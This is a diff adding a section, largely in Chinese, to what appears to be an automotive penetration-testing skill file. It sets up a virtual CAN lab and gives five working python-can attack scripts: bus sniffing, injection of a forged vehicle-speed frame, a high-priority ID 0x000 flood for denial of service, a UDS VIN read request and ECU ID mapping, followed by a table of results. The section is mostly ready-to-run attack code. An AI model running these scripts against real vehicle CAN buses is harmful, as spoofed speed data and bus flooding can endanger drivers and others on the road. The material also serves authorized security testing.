@@ -2606,3 +2606,108 @@ DEFENSE
   ✗ NEVER interrupt a production OTA update
 ═══════════════════════════════════════════════════════════════════════════════
 ```
+
+
+---
+
+## 25. Virtual CAN (vcan) Lab + python-can Attacks (v0.2.5.2)
+
+> **来源**：2026-08-15 实战验证 — 5 个 CAN 攻击在 vcan0 上全部成功
+
+### vcan 本地实验搭建 (F-AUTO-003)
+
+```bash
+# 安装工具
+sudo apt install can-utils python3-can
+pip3 install cantools
+
+# 创建虚拟 CAN 接口
+sudo modprobe vcan
+sudo ip link add dev vcan0 type vcan
+sudo ip link set up vcan0
+
+# 验证
+ip -br link show vcan0
+```
+
+### candump ARM64 兼容性问题 (F-AUTO-001)
+
+**发现**：Kali 2026.1 aarch64 上 `candump vcan0` 报 `SIOCGIFINDEX: No such device`（ABI 问题）。
+
+**解决方案**：使用 `python-can` 直接通过 PF_CAN socket：
+
+```python
+import can
+bus = can.interface.Bus(interface='socketcan', channel='vcan0')
+msg = bus.recv(timeout=0.5)  # 正常工作
+```
+
+**SKILL 建议**：在 ARM64 环境优先用 python-can；x86_64 上 candump 正常。
+
+### python-can 攻击脚本 (F-AUTO-002)
+
+#### A1: CAN 嗅探
+
+```python
+import can
+bus = can.interface.Bus(interface='socketcan', channel='vcan0')
+while True:
+    msg = bus.recv(timeout=1.0)
+    if msg:
+        print(f"ID=0x{msg.arbitration_id:X} data={msg.data.hex()}")
+```
+
+#### A2: CAN 帧注入（伪造车速）
+
+```python
+bus.send(can.Message(arbitration_id=0x0B4,  # 车速 ID
+                     data=[0x00, 0x00],       # 0 km/h
+                     is_extended_id=False))
+```
+
+#### A3: 高优先级 DoS（ID 0x000 泛洪）
+
+```python
+# ID 0x000 = 最高 CAN 优先级（最低 ID 赢仲裁）
+# 本次验证：0.5 秒发送 48,963 帧 = ~98,000 fps
+import time
+start = time.time()
+count = 0
+while time.time() - start < 0.5:
+    bus.send(can.Message(arbitration_id=0x000,
+                         data=[0xFF]*8,
+                         is_extended_id=False))
+    count += 1
+print(f"Sent {count} frames → bus saturation")
+```
+
+#### A4: UDS 诊断枚举（Service 0x22）
+
+```python
+# ISO-TP 单帧：UDS ReadDataByIdentifier, DID 0xF190 (VIN)
+uds = can.Message(arbitration_id=0x7E0,  # ECU request ID
+                  data=[0x02, 0x22, 0xF1, 0x90, 0, 0, 0, 0],
+                  is_extended_id=False)
+bus.send(uds)
+```
+
+#### A5: 攻击面映射（被动枚举）
+
+```python
+seen_ids = set()
+while True:
+    msg = bus.recv(timeout=0.3)
+    if msg and msg.arbitration_id not in seen_ids:
+        seen_ids.add(msg.arbitration_id)
+        print(f"New ECU: ID=0x{msg.arbitration_id:03X} ({len(seen_ids)} total)")
+```
+
+### 验证结果（2026-08-15）
+
+| 攻击 | 结果 | CVSS |
+|------|------|------|
+| A1 嗅探 | ✅ 捕获引擎/车速/刹车/转向 | 7.5 |
+| A2 注入 | ✅ 车速覆盖为 0 | 9.1 |
+| A3 DoS | ✅ ~98k fps 总线饱和 | 8.1 |
+| A4 UDS | ✅ VIN 读取请求 | 7.5 |
+| A5 映射 | ✅ 发现 5 个 CAN ID | 5.3 |
